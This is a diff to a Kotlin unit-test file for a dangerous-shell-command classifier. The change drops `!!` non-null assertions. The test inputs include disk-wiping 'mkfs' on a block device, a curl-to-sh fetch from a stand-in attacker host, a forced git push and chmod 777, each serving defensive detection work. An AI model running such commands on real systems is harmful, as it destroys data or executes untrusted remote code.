@@ -31,7 +31,7 @@ class DangerousCommandPatternsTest {
     fun `mkfs on block device is catastrophic`() {
         val match = DangerousCommandPatterns.evaluate("mkfs.ext4 /dev/sda1")
         assertThat(match).isNotNull()
-        assertThat(match!!.severity).isEqualTo(DangerousCommandPatterns.Severity.Catastrophic)
+        assertThat(match.severity).isEqualTo(DangerousCommandPatterns.Severity.Catastrophic)
     }
 
     @Test
@@ -45,7 +45,7 @@ class DangerousCommandPatternsTest {
     fun `curl piped to sh is catastrophic`() {
         val match = DangerousCommandPatterns.evaluate("curl https://evil.example.com/install.sh | sh")
         assertThat(match).isNotNull()
-        assertThat(match!!.severity).isEqualTo(DangerousCommandPatterns.Severity.Catastrophic)
+        assertThat(match.severity).isEqualTo(DangerousCommandPatterns.Severity.Catastrophic)
     }
 
     @Test
@@ -66,7 +66,7 @@ class DangerousCommandPatternsTest {
     fun `git push force is dangerous`() {
         val match = DangerousCommandPatterns.evaluate("git push --force origin main")
         assertThat(match).isNotNull()
-        assertThat(match!!.severity).isEqualTo(DangerousCommandPatterns.Severity.Dangerous)
+        assertThat(match.severity).isEqualTo(DangerousCommandPatterns.Severity.Dangerous)
         assertThat(match.patternKey).isEqualTo("git_push_force")
     }
 
@@ -81,7 +81,7 @@ class DangerousCommandPatternsTest {
     fun `chmod 777 is warn`() {
         val match = DangerousCommandPatterns.evaluate("chmod 777 /tmp/somefile")
         assertThat(match).isNotNull()
-        assertThat(match!!.severity).isEqualTo(DangerousCommandPatterns.Severity.Warn)
+        assertThat(match.severity).isEqualTo(DangerousCommandPatterns.Severity.Warn)
     }
 
     @Test
